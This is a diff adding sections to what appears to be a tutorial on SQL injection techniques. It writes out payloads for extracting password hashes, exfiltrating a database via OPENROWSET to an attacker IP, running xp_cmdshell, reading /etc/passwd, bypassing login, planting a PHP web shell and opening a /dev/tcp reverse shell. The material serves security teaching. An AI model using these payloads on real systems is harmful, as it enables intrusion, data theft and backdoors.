@@ -109,3 +109,119 @@ syscolumns, systypes where sysobjects.xtype = 'U' AND sysobjects.id = syscolumns
   <ul>' and 1 in (select var from temp) --</ul>
   <ul>' ;  drop table temp --</ul>
 </ol></p>
+
+<h1>Grabbing SQL Server Hashes</h1>
+<p>Some databases store user IDS and passwords in a syslogins table in the form of hash values. An attacker tries to extract clear text credentials, password hashes, tokens etc. from the database to 
+further compromise the target network. To extract this information, attackers need to execute a sequence of queries against the target database:</p>
+<p>Example: hashes are extracted using <i>SELECT password FROM sys.syslogins</i> -> hex each hash:</p>
+<p><ol>
+  <ul>begin @charvalue='0x', @i=1, @length=datalength(@binvalue),</ul>
+  <ul>@hexstring = '0123456789ABCDEF'</ul>
+  <ul>while (@i<=@length) BEGIN</ul>
+  <ul>declare @tempint int, @firstint int, @secondint int</ul>
+  <ul>select @tempint=CONVERT(int, SUBSTRING(@binvalue,@i,1))</ul>
+  <ul>select @firstint=FLOOR(@tempint/16)</ul>
+  <ul>select @secondint=@tempint - @firstint*16)</ul>
+  <ul>select @charvalue=@charvalue + SUBSTRING</ul>
+  <ul>(@hexstring,@firstint+1,1) + SUBSTRING (@hexstring, @secondint+1,1)</ul>
+  <ul>select @i=@i+1</ul>
+  <ul>END</ul>
+</ol></p>
+
+<h1>Transfer Database to Attacker's Machine</h1>
+<p>An attacker can link a target SQL server's database to the attacker's own machine and can retrieve data from the target. The attacker uses OPENROWSET; after the db structure is replicated, data transfer takes place.
+The attacker connects to a remote machine on port 80 to transfer data.</p>
+<p><i>'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN; Address=myIP,80;', 'select * from mydatabase..hacked_sysdatabases') select * from sys.sysdatabases --</i></p>
+
+<h1>Interacting with the Operating System</h1>
+<p>There are two different ways to interact with an OS</p>
+<p><ol>
+  <ul>Reading and writing system files from the disk</ul>
+  <ul>Direct command execution via remote shell</ul>
+</ol></p>
+<p>Example:</p>
+<p><ol>
+  <ul><i>CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';</i></ul>
+  <ul><i>CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';</i></ul>
+  <ul>methods are restricted by the database's running privileges and permissions</ul>
+</ol></p>
+
+<h1>Interacting with the File system</h1>
+<p>Attackers exploit the MySQL functionality of allowing text files to be read through the database to obtain the password files and store the results of a query in a text file</p>
+<p><ol>
+  <ul>LOAD_FILE() -> SELECT LOAD_FILE('/etc/passwd')/*</ul>
+  <ul>INTO OUTFILE() -> run a query and dump results into a file</ul>
+</ol></p>
+
+<h1>Network Reconnaissance using SQL Injection</h1>
+<p>Network reconnaissance is the process of testing any potential vulnerability in a computer network. It is also a major type of network attack. Attackers use network mapping tools such as 
+Nmap and Network Topology Mapper to determine the vulnerabilities of the network.</p>
+<p><ol>
+  <ul>Retrieve server name and configuration using <i>' and 1 in (select @@servername) --</i></ul>
+  <ul>use utilities such as NetBIOS, ARP, Local Open Ports, nslookup, ping, ftp, tftp, smb and traceroute to assess networks</ul>
+  <ul>test for firewalls and proxies</ul>
+  <ul>execute xp_cmdshell command with ipconfig/all, tracert myIP, arp -a, nbtstat -c, netstat -ano, route print</ul>
+  <ul>'; exec master xp_cmdshell 'nslookup a.com MyIP'--</ul>
+</ol></p>
+
+<h1>Finding and Bypassing Admin Panel of a website</h1>
+<p>Attackers try to find the admin panel of a website using simple Google dorks and bypass administrator authentication using an SQL injection attack</p>
+<p><ol>
+  <ul>inurl:adminlogin.aspx</ul>
+  <ul>inurl:admin/index.php</ul>
+  <ul>inurl:administrator.php</ul>
+  <ul>inurl:login.asp</ul>
+  <ul>etc.</ul>
+</ol></p>
+<p>Once the attacker obtains access to the admin login page, he tries to find the admin username and password by injecting malicious SQL queries:</p>
+<p><ol>
+  <ul>Username: 1'OR'1'='1</ul>
+  <ul>Password: 1'OR'1'='1</ul>
+</ol></p>
+<p>Some of the SQL queries used by the attacker to bypass admin authentication include:</p>
+<p><ol>
+  <ul>' or 1=1 --</ul>
+  <ul>1'or'1'='1</ul>
+  <ul>admin'--</ul>
+  <ul>" or 0=0 --</ul>
+  <ul>or 0=0 --</ul>
+  <ul>' or 0=0 #</ul>
+  <ul>" or 0=0 #</ul>
+  <ul>or 0=0 #</ul>
+  <ul>' or 'x'='x</ul>
+  <ul>" or "x"="x</ul>
+  <ul>') or ('x'='x</ul>
+  <ul>' or 1=1 --</ul>
+  <ul>" or 1=1 --</ul>
+  <ul>or 1=1--</ul>
+</ol></p>
+
+<h1>PL/SQL Exploitation</h1>
+<p>PL/SQL, similar to the stored procedure, is vulnerable to various SQL injection attacks</p>
+<p><ol>
+  <ul>Exploiting Quotes -> 'x' OR '1'='1'</ul>
+  <ul>Exploitation by Truncation -> inline comments along with username ('Bob''--', ''</ul>
+</ol></p>
+
+<h1>Creating Server Backdoors using SQL Injection</h1>
+<p>The following are different methods to create backdoors:</p>
+<h2>Getting OS Shell</h2>
+<p>Attackers use SQL server functions such as <b>xp_cmdshell</b> to execute arbitrary commands. Every DBMS software has its own naming convention for such functions. Another way to create backdoors is to use 
+<b>SELECT ... INTO OUTFILE</b></p>
+<p>Backdoors can also be created by defining and using stored procedures in the database.</p>
+<h2>Using Outfile</h2>
+<p>If an attacker can access the web server, he can use the following MySQL query to create a PHP shell on the server:<br/>
+<i>SELECT '<?php exec($_GET[''cmd'']);?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'</i></p>
+
+<h2>Finding Directory Structure</h2>
+<p>By learning about the structure of the directory, an attacker can find the location to place the shell on the web server:<br/>
+<i>SELECT @@datadir;</i></p>
+
+<h2>Using Built-in DBMS Functions</h2>
+<p>MSSQL has built-in functions such as <b>xp_cmdshell</b> to call OS functions at run time. For example, the following statement creates an interactive shell listening at 10.0.0.1 and port 8080:<br/>
+<i>EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'</i></p>
+
+<h1>Creating Database Backdoor</h1>
+<p>Attackers use triggers to create database backdoors. A database trigger is a stored procedure that is automatically invoked and executed in response to certain database events. For example, an online 
+shopping website stores the details of all the items it sells in a database called ITEMS. An attacker may inject a malicious trigger into this table such that whenever an INSERT query is executed, the 
+trigger will automatically set the price of the item to 0.</p>
